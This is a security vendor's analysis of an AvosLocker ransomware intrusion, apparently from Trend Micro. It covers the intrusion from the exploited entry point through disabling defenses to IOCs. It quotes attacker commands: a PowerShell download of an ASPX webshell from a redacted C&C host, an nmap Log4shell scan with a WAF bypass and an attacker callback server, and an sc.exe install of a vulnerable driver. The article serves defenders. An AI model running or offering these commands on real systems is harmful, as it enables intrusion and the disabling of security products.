<div>
<p>Ransomware</p>
<h1 class="article-details__title">AvosLocker Ransomware Variant Abuses Driver File to Disable Anti-Virus, Scans for Log4shell</h1>
<p>We found an AvosLocker ransomware variant using a legitimate anti-virus component to disable detection and blocking solutions.</p>
<p>By: Christoper Ordonez, Alvin Nieto
		
			May 02, 2022
Read time: 7 min (1825 words)
	</p>
<a class="addthis_button_compact addthis_link">
<img alt="Share" class="addthis-icon" src="https://www.trendmicro.com/etc.clientlibs/trendresearch/clientlibs/clientlib-trendresearch/resources/img/share-more.svg" style="max-width:80%;height:auto;width:auto;"/>
</a>
<a class="addthis_button_print addthis_link">
<img alt="Print" class="addthis-icon" src="https://www.trendmicro.com/etc.clientlibs/trendresearch/clientlibs/clientlib-trendresearch/resources/img/printer.svg" style="max-width:80%;height:auto;width:auto;"/>
</a>
<p>Save to Folio</p>
<a href="https://www.trendmicro.com/subscription" target="target" title="Subscribe">
 Subscribe
</a>
<p>We found samples of <a href="https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-avoslocker">AvosLocker</a> <a href="https://www.trendmicro.com/vinfo/us/security/definition/ransomware">ransomware</a> that makes use of a legitimate driver file to disable anti-virus solutions and detection evasion. While previous AvosLocker infections employ similar routines, this is the first sample we observed from the US with the capability to disable a defense solution using a legitimate Avast Anti-Rootkit Driver file (asWarPot.sys). In addition, the ransomware is also capable of scanning multiple endpoints for the Log4j vulnerability Log4shell using Nmap NSE script.</p>
<p>Infection chain</p>
<figure class="image-figure">
<img alt="fig1-avoslocker-ransomware-disables-av-scans-log4shell" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/e/avoslocker-ransomware-variant-abuses-driver-file-to-disable-anti-virus-scans-for-log4shell/Figure-1-avoslocker-disables-defense-solutions-scans-for-log4shell.jpg" style="max-width:80%;height:auto;width:auto;"/>
<figcaption>Figure 1. AvosLocker infection chain</figcaption>
</figure>
<p>According to our analysis, the suspected entry point is via the Zoho ManageEngine ADSelfService Plus (ADSS) exploit:</p>
<figure class="image-figure">
<img alt="fig2-avoslocker-ransomware-disables-av-scans-log4shell" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/e/avoslocker-ransomware-variant-abuses-driver-file-to-disable-anti-virus-scans-for-log4shell/Figure2-avoslocker-disables-defense-solutions-scans-for-log4shell.png" style="max-width:80%;height:auto;width:auto;"/>
<figcaption>Figure 2. The ADSS exploit abusing CVE-2021-40539</figcaption>
</figure>
<p>Due to the lack of network traffic details, we could not identify the exact CVE ID of the security gap the attacker used. However, there are some indications that they abused the same vulnerability <a href="https://www.synacktiv.com/en/publications/how-to-exploit-cve-2021-40539-on-manageengine-adselfservice-plus.html">previously documented</a> by Synacktiv during a pentest, <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-40539">CVE-2021-40539</a>. The gap we observed was particularly similar to the creation of JSP files (test.jsp), execution of keytool.exe with “null” parameters to run a crafted Java class/code.</p>
<p>Mapping the infection</p>
<p>The ADSS JAVA component (C:\ManageEngine\ADSelfService Plus\jre\bin\java.exe) executed mshta.exe to remotely run a remotely-hosted HTML application (HTA) file from the attackers’ command and control (C&amp;C) server. Using Trend Micro™ Vision One™, we mapped out the processes that the infection performed to spawn the process. </p>
<figure class="image-figure">
<img alt="fig3-avoslocker-ransomware-disables-av-scans-log4shell" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/e/avoslocker-ransomware-variant-abuses-driver-file-to-disable-anti-virus-scans-for-log4shell/Figure3-avoslocker-disables-defense-solutions-scans-for-log4shell.png" style="max-width:80%;height:auto;width:auto;"/>
<figcaption>Figure 3. Remotely executing an HTA file from the C&amp;C server. Screenshots taken from Trend Micro Vison One. </figcaption>
</figure>
<figure class="image-figure">
<img alt="fig4-avoslocker-ransomware-disables-av-scans-log4shell" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/e/avoslocker-ransomware-variant-abuses-driver-file-to-disable-anti-virus-scans-for-log4shell/Figure4-avoslocker-disables-defense-solutions-scans-for-log4shell.png" style="max-width:80%;height:auto;width:auto;"/>
<figcaption>Figure 4. HTA file connecting to the C&amp;C</figcaption>
</figure>
<p>A closer look at the HTA file revealed that the mshta.exe downloads and executes the remotely hosted HTA file. The HTA executed an obfuscated PowerShell script that contains a shellcode, capable of connecting back to the C&amp;C server to execute arbitrary commands.</p>
<figure class="image-figure">
<img alt="fig5-avoslocker-ransomware-disables-av-scans-log4shell" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/e/avoslocker-ransomware-variant-abuses-driver-file-to-disable-anti-virus-scans-for-log4shell/Figure5-avoslocker-disables-defense-solutions-scans-for-log4shell.png" style="max-width:80%;height:auto;width:auto;"/>
<figcaption>Figure 5. Obfuscated PowerShell script contains a shellcode</figcaption>
</figure>
<p>The PowerShell process will download an ASPX webshell from the C&amp;C server using the command &lt; cmd.exe /c powershell -command Invoke-WebRequest -Uri hxxp://xx.xx.xx.xx/subshell.aspx -OutFile /ManageEngine/ADSelfService Plus/webapps/adssp/help/admin-guide &gt;. According to Synacktiv’s <a href="https://www.synacktiv.com/en/publications/how-to-exploit-cve-2021-40539-on-manageengine-adselfservice-plus.html#:~:text=For%20a%20little%20more%20confort%2C%20it%20is%20also%20possible%20to%20exploit%20the%20file%20upload%20to%20write%20a%20JSP%20webshell%20on%20the%20filesystem.%20It%20can%20then%20be%20moved%20into%20the%20webroot%20with%20the%20Java%20code%20execution.">research</a>, with this command, the downloaded ASPX webshell is downloaded from a remote IP address and saved to the directory, and still accessible to the attacker. The attackers gathered system information using available tools such as whoami and systeminfo, as well as PowerShell commands.</p>
<figure class="image-figure">
<img alt="fig6-avoslocker-ransomware-disables-av-scans-log4shell" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/e/avoslocker-ransomware-variant-abuses-driver-file-to-disable-anti-virus-scans-for-log4shell/Figure6-avoslocker-disables-defense-solutions-scans-for-log4shell.png" style="max-width:80%;height:auto;width:auto;"/>
<figcaption>Figure 6. Gather system information</figcaption>
</figure>
<p>The code executes on the current domain controller to gather the username information, while the query user information gathers data about user sessions on a Remote Desktop Session Host server, name of the user, session ID, state of the session (either active or disconnected), idle time, date, and time the user logged on.</p>
<figure class="image-figure">
<img alt="fig7-avoslocker-ransomware-disables-av-scans-log4shell" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/e/avoslocker-ransomware-variant-abuses-driver-file-to-disable-anti-virus-scans-for-log4shell/Figure7-avoslocker-disables-defense-solutions-scans-for-log4shell.png" style="max-width:80%;height:auto;width:auto;"/>
<figcaption>Figure 7. Executed with the /domain argument to collect username information</figcaption>
</figure>
<figure class="image-figure">
<img alt="fig8-avoslocker-ransomware-disables-av-scans-log4shell" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/e/avoslocker-ransomware-variant-abuses-driver-file-to-disable-anti-virus-scans-for-log4shell/Figure8-avoslocker-disables-defense-solutions-scans-for-log4shell.png" style="max-width:80%;height:auto;width:auto;"/>
<figcaption>Figure 8. query user information for session data</figcaption>
</figure>
<p>The PowerShell downloads, installs, and allows the remote desktop tool AnyDeskMSI through the firewall.</p>
<figure class="image-figure">
<img alt="fig9-avoslocker-ransomware-disables-av-scans-log4shell" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/e/avoslocker-ransomware-variant-abuses-driver-file-to-disable-anti-virus-scans-for-log4shell/figure-9-avoslocker-disables-defense-solutions-scans-for-log4shell.jpg" style="max-width:80%;height:auto;width:auto;"/>
<figcaption>Figure 9. The PowerShell downloading and installing AnyDeskMSI</figcaption>
</figure>
<p>We observed that a new user account was created, added to the current domain, and included in the administrator group. This ensures the attacker can have administrative rights to the infected system. The attackers also checked the running processes in the system via TaskList to check for anti-virus processes running in the infiltrated system.</p>
<figure class="image-figure">
<img alt="fig10-avoslocker-ransomware-disables-av-scans-log4shell" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/e/avoslocker-ransomware-variant-abuses-driver-file-to-disable-anti-virus-scans-for-log4shell/Figure10-avoslocker-disables-defense-solutions-scans-for-log4shell.png" style="max-width:80%;height:auto;width:auto;"/>
<figcaption>Figure 10. Creating a new account with admin rights</figcaption>
</figure>
<figure class="image-figure">
<img alt="fig11-avoslocker-ransomware-disables-av-scans-log4shell" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/e/avoslocker-ransomware-variant-abuses-driver-file-to-disable-anti-virus-scans-for-log4shell/Figure11-avoslocker-disables-defense-solutions-scans-for-log4shell.png" style="max-width:80%;height:auto;width:auto;"/>
<figcaption>Figure 11. Checking for anti-virus processes running</figcaption>
</figure>
<p>During the scan, we observed an attempt to terminate security products initiated via TaskKill. Testing the sample with Trend Micro Vision One, the attempt failed as its sensors were still able to send activity data to the platform.</p>
<figure class="image-figure">
<img alt="fig12-avoslocker-ransomware-disables-av-scans-log4shell" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/e/avoslocker-ransomware-variant-abuses-driver-file-to-disable-anti-virus-scans-for-log4shell/Figure12-avoslocker-disables-defense-solutions-scans-for-log4shell.png" style="max-width:80%;height:auto;width:auto;"/>
<figcaption>Figure 12. Terminating security products running</figcaption>
</figure>
<p>Tools and functions</p>
<p>Additional tools and components were copied to the compromised machine using AnyDeskMSI to scan the local network and disable security products. The tools transferred using AnyDesk are:</p>
<ul>
<li class="rich-text-li">Netscan: To scan for other endpoints</li>
<li class="rich-text-li">Nmap (log4shell.nse): To scan for <a href="https://www.trendmicro.com/en_us/research/21/l/patch-now-apache-log4j-vulnerability-called-log4shell-being-acti.html">Log4shell</a> vulnerable endpoints</li>
<li class="rich-text-li">Hacking tools Mimikatz and Impacket: For lateral movement</li>
<li class="rich-text-li">PDQ deploy: For mass deployment of malicious script to multiple endpoints</li>
<li class="rich-text-li">Aswarpot.sys: For disabling defense solutions. We noted that it can disable a number of anti-virus products, previously <a href="https://www.aon.com/cyber-solutions/aon_cyber_labs/yours-truly-signed-av-driver-weaponizing-an-antivirus-driver/#:~:text=Utilizing%20the%20HashDB,McAfee%C2%AE%2C%20and%20Malwarebytes%C2%AE.%C2%A0">identified</a> by Aon’s researchers.</li>
</ul>
<figure class="image-figure">
<img alt="fig13-avoslocker-ransomware-disables-av-scans-log4shell" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/e/avoslocker-ransomware-variant-abuses-driver-file-to-disable-anti-virus-scans-for-log4shell/Figure13-avoslocker-disables-defense-solutions-scans-for-log4shell.png" style="max-width:80%;height:auto;width:auto;"/>
<figcaption>Figure 13. Copying tools and other malicious components to the compromised machine using AnyDesk</figcaption>
</figure>
<p>We found an Avast anti-rootkit driver installed as service 'asWarPot.sys' using the command sc.exe create aswSP_ArPot2 binPath= C:\windows\aswArPot.sys type= kernel. It installs the driver file in preparation for disabling the running anti-virus product. We noted the unusual use of cmd.exe for execution of the file. </p>
<figure class="image-figure">
<img alt="fig14-avoslocker-ransomware-disables-av-scans-log4shell" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/e/avoslocker-ransomware-variant-abuses-driver-file-to-disable-anti-virus-scans-for-log4shell/Figure14-avoslocker-disables-defense-solutions-scans-for-log4shell.png" style="max-width:80%;height:auto;width:auto;"/>
<figcaption>Figure 14. Executing the anti-rootkit driver in the system</figcaption>
</figure>
<p>Mimikatz components were also copied to the affected machine via AnyDeskMSI. However, these components were detected and deleted.</p>
<figure class="image-figure">
<img alt="fig15-avoslocker-ransomware-disables-av-scans-log4shell" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/e/avoslocker-ransomware-variant-abuses-driver-file-to-disable-anti-virus-scans-for-log4shell/Figure15-avoslocker-disables-defense-solutions-scans-for-log4shell.png" style="max-width:80%;height:auto;width:auto;"/>
<figcaption>Figure 15. Detecting and deleting Mimikatz </figcaption>
</figure>
<p>We observed the PowerShell script disabling the security products by leveraging aswarpot.sys (a legitimate Avast Anti-Rootkit Driver). A list of security product processes was supplied and subsequently terminated by the driver.</p>
<figure class="image-figure">
<img alt="fig16-avoslocker-ransomware-disables-av-scans-log4shell" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/e/avoslocker-ransomware-variant-abuses-driver-file-to-disable-anti-virus-scans-for-log4shell/Figure16-avoslocker-disables-defense-solutions-scans-for-log4shell.png" style="max-width:80%;height:auto;width:auto;"/>
<figcaption>Figure 16. Listing and terminating the security products found running in the compromised system</figcaption>
</figure>
<p>Verification: Manual replication of anti-virus disabling routine</p>
<p>We manually replicated the routine and commands for disabling the defense solutions to further look into the routine. Figure 17 shows the list of processes that the routine searches on infection :</p>
<ul>
<li class="rich-text-li">EndpointBasecamp.exe</li>
<li class="rich-text-li">Trend Micro Endpoint Basecamp</li>
<li class="rich-text-li">ResponseService.exe</li>
<li class="rich-text-li">PccNTMon.exe</li>
<li class="rich-text-li">SupportConnector.exe</li>
<li class="rich-text-li">AOTAgent.exe</li>
<li class="rich-text-li">CETASvc.exe</li>
<li class="rich-text-li">CETASvc</li>
<li class="rich-text-li">iVPAgent.exe</li>
<li class="rich-text-li">tmwscsvc.exe</li>
<li class="rich-text-li">TMResponse</li>
<li class="rich-text-li">AOTAgentSvc</li>
<li class="rich-text-li">TMBMServer</li>
<li class="rich-text-li">iVPAgent</li>
<li class="rich-text-li">Trend Micro Web Service Communicator</li>
<li class="rich-text-li">Tmccsf</li>
<li class="rich-text-li">Tmlisten</li>
<li class="rich-text-li">Ntrtscan</li>
<li class="rich-text-li">TmWSCSvc</li>
</ul>
<figure class="image-figure">
<img alt="fig17-avoslocker-ransomware-disables-av-scans-log4shell" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/e/avoslocker-ransomware-variant-abuses-driver-file-to-disable-anti-virus-scans-for-log4shell/Figure17-avoslocker-disables-defense-solutions-scans-for-log4shell.jpg" style="max-width:80%;height:auto;width:auto;"/>
<figcaption>Figure 17. Searching for processes</figcaption>
</figure>
<p>We found that aswArPot.sys, registered as aswSP_ArPot2 as a service, is used as the handle for the following DeviceIoControl call.</p>
<figure class="image-figure">
<img alt="fig18-avoslocker-ransomware-disables-av-scans-log4shell" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/e/avoslocker-ransomware-variant-abuses-driver-file-to-disable-anti-virus-scans-for-log4shell/Figure18-avoslocker-disables-defense-solutions-scans-for-log4shell.png" style="max-width:80%;height:auto;width:auto;"/>
<figcaption>Figure 18. Driver file preparing to disable an anti-virus product</figcaption>
</figure>
<p>The DeviceIoControl function is used to execute parts of the driver. In this case, the DeviceIoControl is inside a loop that iterates through the list of processes mentioned above. Additionally, we can see that 0x9988C094 is passed to DeviceIoControl as an argument simultaneous to the ID of the current process in the iteration.</p>
<figure class="image-figure">
<img alt="fig19-avoslocker-ransomware-disables-av-scans-log4shell" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/e/avoslocker-ransomware-variant-abuses-driver-file-to-disable-anti-virus-scans-for-log4shell/Figure19-avoslocker-disables-defense-solutions-scans-for-log4shell.png" style="max-width:80%;height:auto;width:auto;"/>
<figcaption>Figure 19. DeviceIoControl as an argument with the current process ID</figcaption>
</figure>
<p>Inside aswArPot.sys, we saw 0x9988C094 in a switch case with a function sub_14001DC80 case. Inside function sub_14001DC80, we can see that that function has the capability to terminate a given process.</p>
<figure class="image-figure">
<img alt="fig20-avoslocker-ransomware-disables-av-scans-log4shell" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/e/avoslocker-ransomware-variant-abuses-driver-file-to-disable-anti-virus-scans-for-log4shell/figure-20-avoslocker-disables-defense-solutions-scans-for-log4shell.jpg" style="max-width:80%;height:auto;width:auto;"/>
<figcaption>Figure 20. 0x9988C094 in a switch case with sub_14001DC80 (above), with the latter value terminating a process (below).</figcaption>
</figure>
<p>Other executions and lateral movement</p>
<p>After disabling the security products, the actors behind AvosLocker again tried to transfer other tools, namely Mimikatz and Impacket.</p>
<figure class="image-figure">
<img alt="fig21-avoslocker-ransomware-disables-av-scans-log4shell" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/e/avoslocker-ransomware-variant-abuses-driver-file-to-disable-anti-virus-scans-for-log4shell/figure-21-avoslocker-disables-defense-solutions-scans-for-log4shell.jpg" style="max-width:80%;height:auto;width:auto;"/>
<figcaption>Figure 21. Execution of Mimikatz (above) and Impacket via C:\temp\wmiexec.exe (below)</figcaption>
</figure>
<p>We also observed the execution of a password recovery tool XenArmor with C:\temp\pass\start.exe.</p>
<figure class="image-figure">
<img alt="fig22-avoslocker-ransomware-disables-av-scans-log4shell" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/e/avoslocker-ransomware-variant-abuses-driver-file-to-disable-anti-virus-scans-for-log4shell/Figure22-avoslocker-disables-defense-solutions-scans-for-log4shell.png" style="max-width:80%;height:auto;width:auto;"/>
<figcaption>Figure 22. XenArmor password recovery tool execution</figcaption>
</figure>
<p>We observed the attackers using an NMAP script to check for Log4shell, the Apache Log4j remote code execution (RCE, with ID CVE-2021-44228) vulnerability across the network. They used the command nmap --script log4shell.nse --script-args log4shell.waf-bypass=true --script-args log4shell.callback-server=xx.xx.xx.xx:1389 -p 80,443 xx.xx.xx.xx/xx, and set the callback server to the attacker group C&amp;C server. </p>
<figure class="image-figure">
<img alt="fig23-avoslocker-ransomware-disables-av-scans-log4shell" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/e/avoslocker-ransomware-variant-abuses-driver-file-to-disable-anti-virus-scans-for-log4shell/Figure23-avoslocker-disables-defense-solutions-scans-for-log4shell.png" style="max-width:80%;height:auto;width:auto;"/>
<figcaption>Figure 23. Checking for log4shell</figcaption>
</figure>
<p>We also observed more system network configuration discovery techniques being run, possibly for lateral movement as it tried looking for other available endpoints.</p>
<figure class="image-figure">
<img alt="fig24-avoslocker-ransomware-disables-av-scans-log4shell" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/e/avoslocker-ransomware-variant-abuses-driver-file-to-disable-anti-virus-scans-for-log4shell/Figure24-avoslocker-disables-defense-solutions-scans-for-log4shell.png" style="max-width:80%;height:auto;width:auto;"/>
<figcaption>Figure 24. Running more system network configuration discovery scans</figcaption>
</figure>
<p>Deploying across the network</p>
<p>We saw software deployment tool PDQ being used to deploy malicious batch scripts to multiple endpoints in the network.</p>
<figure class="image-figure">
<img alt="fig25-avoslocker-ransomware-disables-av-scans-log4shell" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/e/avoslocker-ransomware-variant-abuses-driver-file-to-disable-anti-virus-scans-for-log4shell/Figure25-avoslocker-disables-defense-solutions-scans-for-log4shell.png" style="max-width:80%;height:auto;width:auto;"/>
<figcaption>Figure 25. Deploying malicious batch scripts to other endpoints</figcaption>
</figure>
<p>The deployed batch script has the following commands:</p>
<ul>
<li class="rich-text-li">Disable Windows Update and Microsoft Defender</li>
</ul>
<figure class="image-figure">
<img alt="fig26-avoslocker-ransomware-disables-av-scans-log4shell" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/e/avoslocker-ransomware-variant-abuses-driver-file-to-disable-anti-virus-scans-for-log4shell/Figure26-avoslocker-disables-defense-solutions-scans-for-log4shell.png" style="max-width:80%;height:auto;width:auto;"/>
<figcaption>Figure 26. Disable Microsoft defense services</figcaption>
</figure>
<ul>
<li class="rich-text-li">Prevents safeboot execution of security products</li>
</ul>
<figure class="image-figure">
<img alt="fig27-avoslocker-ransomware-disables-av-scans-log4shell" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/e/avoslocker-ransomware-variant-abuses-driver-file-to-disable-anti-virus-scans-for-log4shell/Figure27-avoslocker-disables-defense-solutions-scans-for-log4shell.png" style="max-width:80%;height:auto;width:auto;"/>
<figcaption>Figure 27. Prevent security products’ execution</figcaption>
</figure>
<ul>
<li class="rich-text-li">Create new administrator account</li>
</ul>
<figure class="image-figure">
<img alt="fig28-avoslocker-ransomware-disables-av-scans-log4shell" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/e/avoslocker-ransomware-variant-abuses-driver-file-to-disable-anti-virus-scans-for-log4shell/Figure28-avoslocker-disables-defense-solutions-scans-for-log4shell.png" style="max-width:80%;height:auto;width:auto;"/>
<figcaption>Figure 28. Create new account</figcaption>
</figure>
<ul>
<li class="rich-text-li">Add the AutoStart mechanism for the AvosLocker executable (update.exe)</li>
</ul>
<figure class="image-figure">
<img alt="fig29-avoslocker-ransomware-disables-av-scans-log4shell" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/e/avoslocker-ransomware-variant-abuses-driver-file-to-disable-anti-virus-scans-for-log4shell/Figure29-avoslocker-disables-defense-solutions-scans-for-log4shell.png" style="max-width:80%;height:auto;width:auto;"/>
<figcaption>Figure 29. Add Autostart for ransomware executable</figcaption>
</figure>
<ul>
<li class="rich-text-li">Disables legal notice caption</li>
</ul>
<figure class="image-figure">
<img alt="fig30-avoslocker-ransomware-disables-av-scans-log4shell" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/e/avoslocker-ransomware-variant-abuses-driver-file-to-disable-anti-virus-scans-for-log4shell/Figure30-avoslocker-disables-defense-solutions-scans-for-log4shell.png" style="max-width:80%;height:auto;width:auto;"/>
<figcaption>Figure 30. Disable legal notice</figcaption>
</figure>
<ul>
<li class="rich-text-li">Set safeboot with networking and disables Windows Error Recovery and reboot</li>
</ul>
<figure class="image-figure">
<img alt="fig31-avoslocker-ransomware-disables-av-scans-log4shell" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/e/avoslocker-ransomware-variant-abuses-driver-file-to-disable-anti-virus-scans-for-log4shell/Figure31-avoslocker-disables-defense-solutions-scans-for-log4shell.png" style="max-width:80%;height:auto;width:auto;"/>
<figcaption>Figure 31. Setting and disabling network and specific Windows functions</figcaption>
</figure>
<p>Conclusion</p>
<p>While AvosLocker has been documented for its abuse of AnyDesk for lateral movement as its preferred application, we note that <a href="https://www.trendmicro.com/en_us/research/21/k/campaign-abusing-rats-uses-fake-websites.html">other</a> remote access applications can also be abused to replace it. We think the same can be said for the software deployment tool, wherein the malicious actors can subsequently decide to replace and abuse it with other commercially available ones. In addition, aside from its availability, the decision to choose the specific rootkit driver file is for its capability to execute in kernel mode (therefore operating at a high privilege).</p>
<p>This variant is also capable of modifying other details of the installed security solutions, such as disabling the legal notice. Other modern ransomware, such as <a href="https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/ransomware-as-a-service-enabler-of-widespread-attacks">Mespinoza/Pysa</a>, modify the registries of infected systems during their respective routines to inform their victims that they have been compromised.</p>
<p>Similar to previously documented malware and ransomware groups, AvosLocker takes advantage of the different vulnerabilities that have yet to be patched to get into organizations’ networks. Once inside, the continuing trend of abusing legitimate tools and functions to mask malicious activities and actors’ presence grows in sophistication. In this case, the attackers were able to study and use Avast’s driver as part of their arsenal to disable other vendors’ security products.</p>
<p>However, and specific to this instance, the attempt to kill an anti-virus product such as this variant’s TaskKill can also be foiled. In this example using Trend Micro Vision One, the attempt was unsuccessful likely due to the product’s self-protection feature, which allowed the sensors to continue sending data and block the noted routine. The visibility enabled by the platform allowed us as researchers to capture the extent of this ransomware’s attack chain and replicate the driver file being abused to verify its function during compromise.</p>
<p>Avast responded to our notification with this statement:</p>
<p>"We can confirm the vulnerability in an old version of our driver aswArPot.sys, which we fixed in our Avast 21.5 released in June 2021. We also worked closely with Microsoft, so they released a block in the Windows operating system (10 and 11), so the old version of the Avast driver can't be loaded to memory.</p>
<p>The below example shows that the blocking works (output from the "sc start" command):</p>
<p> (SC) StartService FAILED 1275:</p>
<p> This driver has been blocked from loading</p>
<p>The update from Microsoft for the Windows operating system was published in February as an optional update, and in Microsoft's security release in April, so fully updated machines running Windows 10 and 11 are not vulnerable to this kind of attack.</p>
<p>All consumer and business antivirus versions of Avast and AVG detect and block this AvosLocker ransomware variant, so our users are protected from this attack vector.</p>
<p>For users of third-party antivirus software, to stay protected against this vulnerability, we recommend users to update their Windows operating system with the latest security updates, and to use a fully updated antivirus program."</p>
<p>Indicators of Compromise (IOCs) </p>
<table border="1" cellpadding="1" cellspacing="0">
<tbody><tr><th scope="col">File</th>
<th scope="col">SHA256</th>
<th scope="col">Detection</th>
</tr><tr><td>Malicious batch file component</td>
<td>a5ad3355f55e1a15baefea83ce81d038531af516f47716018b1dedf04f081f15</td>
<td>Trojan.BAT.KILLAV.YACAA</td>
</tr><tr><td>AvosLocker executable</td>
<td>05ba2df0033e3cd5b987d66b6de545df439d338a20165c0ba96cde8a74e463e5</td>
<td>Ransom.Win32.AVOSLOCKER.SMYXBLNT</td>
</tr><tr><td rowspan="2">Mimikatz executable (x32 and x64)</td>
<td>912018ab3c6b16b39ee84f17745ff0c80a33cee241013ec35d0281e40c0658d9</td>
<td>HackTool.Win64.MIMIKATZ.ZTJA</td>
</tr><tr><td>e81a8f8ad804c4d83869d7806a303ff04f31cce376c5df8aada2e9db2c1eeb98</td>
<td>HackTool.Win32.Mimikatz.CNFW</td>
</tr><tr><td>Log4shell Nmap NSE script</td>
<td>ddcb0e99f27e79d3536a15e0d51f7f33c38b2ae48677570f36f5e92863db5a96</td>
<td>Backdoor.Win32.CVE202144228.YACAH</td>
</tr><tr><td>Impacket tool</td>
<td>14f0c4ce32821a7d25ea5e016ea26067d6615e3336c3baa854ea37a290a462a8</td>
<td>HackTool.Win32.Impacket.AA</td>
</tr></tbody></table>
Tags
<a class="tag--list-anchor" href="https://www.trendmicro.com/en_us/research.html?category=trend-micro-research:threats/malware">Malware</a>
|
<a class="tag--list-anchor" href="https://www.trendmicro.com/en_us/research.html?category=trend-micro-research:threats/exploits-and-vulnerabilities">Exploits &amp; Vulnerabilities</a>
|
<a class="tag--list-anchor" href="https://www.trendmicro.com/en_us/research.html?category=trend-micro-research:threats/cyber-threats">Cyber Threats</a>
|
<a class="tag--list-anchor" href="https://www.trendmicro.com/en_us/research.html?category=trend-micro-research:threats/apt-and-targeted-attacks">APT &amp; Targeted Attacks</a>
|
<a class="tag--list-anchor" href="https://www.trendmicro.com/en_us/research.html?category=trend-micro-research:threats/compliance-and-risks">Compliance &amp; Risks</a>
|
<a class="tag--list-anchor" href="https://www.trendmicro.com/en_us/research.html?category=trend-micro-research:environments/endpoints">Endpoints</a>
|
<a class="tag--list-anchor" href="https://www.trendmicro.com/en_us/research.html?category=trend-micro-research:threats/ransomware">Ransomware</a>
|
<a class="tag--list-anchor" href="https://www.trendmicro.com/en_us/research.html?category=trend-micro-research:environments/network">Network</a>
|
<a class="tag--list-anchor" href="https://www.trendmicro.com/en_us/research.html?category=trend-micro-research:medium/article">Articles, News, Reports</a>
<h3 class="article-authors__title">
	
		Authors
	
</h3>
<ul class="article-authors__list">
<li class="article-authors__list-items">
<p>Christoper Ordonez</p>
<p>Threats Analyst</p>
</li>
<li class="article-authors__list-items">
<p>Alvin Nieto</p>
<p>Threats Analyst</p>
</li>
</ul>
<a class="article-authors__button" href="mailto:tm_research@trendmicro.com" id="article-authors-contact-us-button" target="target">
		Contact Us
	</a>
<a class="article-authors__button subscribe" href="https://www.trendmicro.com/subscription" target="target">
		Subscribe
	</a>
<h3 class="related--articles-title">Related Articles</h3>
<ul class="related--articles-items">
<li class="related--articles-item">
<a class="related--articles-item-anchor" href="https://www.trendmicro.com/en_us/research/22/d/new-apt-group-earth-berberoka-targets-gambling-websites-with-old.html">
					New APT Group Earth Berberoka Targets Gambling Websites With Old and New Malware
				</a>
</li>
<li class="related--articles-item">
<a class="related--articles-item-anchor" href="https://www.trendmicro.com/en_us/research/22/d/attack-surface-management-partner.html">
					Trend Micro Partnering with Bit Discovery
				</a>
</li>
<li class="related--articles-item">
<a class="related--articles-item-anchor" href="https://www.trendmicro.com/en_us/research/22/d/attack-surface-management.html">
					How to better manage your digital attack surface risk
				</a>
</li>
</ul>
<a href="https://www.trendmicro.com/en_us/research.html">
				See all articles
			</a>
<a href="https://www.trendmicro.com/en_us/research.html">
</a>
</div>